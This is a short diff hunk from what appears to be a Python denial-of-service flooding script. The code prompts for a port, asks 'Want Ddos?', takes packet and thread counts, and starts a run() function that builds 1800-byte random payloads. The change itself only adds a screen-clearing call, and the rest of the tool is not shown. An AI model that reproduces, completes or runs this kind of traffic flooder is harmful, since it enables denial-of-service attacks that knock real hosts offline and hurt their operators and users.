@@ -25,6 +25,7 @@ port = int(input(" Port:"))
 choice = str(input(" Want Ddos?(y/n):"))
 times = int(input(" Packets :"))
 threads = int(input(" Threads :"))
+os.system("clear")
 def run():
 	data = random._urandom(1800)
 	i = random.choice(("[+]","[-]"))
